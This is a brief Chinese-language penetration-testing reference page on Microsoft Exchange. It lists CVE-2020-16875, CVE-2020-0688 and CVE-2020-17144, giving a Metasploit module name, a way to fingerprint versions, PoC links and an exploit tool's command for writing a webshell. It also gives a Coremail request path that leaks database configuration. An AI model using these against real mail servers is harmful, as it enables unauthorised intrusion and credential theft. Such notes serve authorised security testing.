---
title: Exchange
---

## 应用简介

Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。

简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。

Exchange是收费邮箱，但是国内微软并不直接出售Exchange邮箱，而是将Exchange、Lync、Sharepoint三款产品包装成Office365出售

## [CVE-2020-16875]-远程命令执行

**漏洞概述**
```http
#影响范围
exchange_server_2016: cu16/cu17
exchange_server_2019: cu5/cu6
```

**漏洞利用**

```bash
use windows/http/exchange_ecp_dlp_policy
```

## [CVE-2020-0688]-远程代码执行

**漏洞概述**

由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的

```http
#影响版本 （需要登陆）
2010、2013、2016、2019
```

**对于如何识别版本可以用如下的方式**：

在登录界面查看网页源代码，15.1.225就是版本，之后在[Mircosoft网站](https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)上根据版本号就可以直接查询

```html
找到<link rel="shortcut icon" href="/owa/auth/15.1.225/themes/resources/favicon.ico" type="image/x-icon">
```

**POC**

https://github.com/random-robbie/cve-2020-0688

## [CVE-2020-17144]-Exchange远程命令执行

https://github.com/Airboi/CVE-2020-17144-EXP

```bash
条件: Exchange2010; 普通用户
默认用法(写webshell): CVE-2020-17144-EXP.exe mail.example.com user pass


执行命令 & 端口复用: 修改ExploitClass.cs
```

## Coremail 配置信息泄露

**POC**

```http
mailsms/s?func=ADMIN:appState&dumpConfig=/
```

可以获取数据库配置信息和推送账号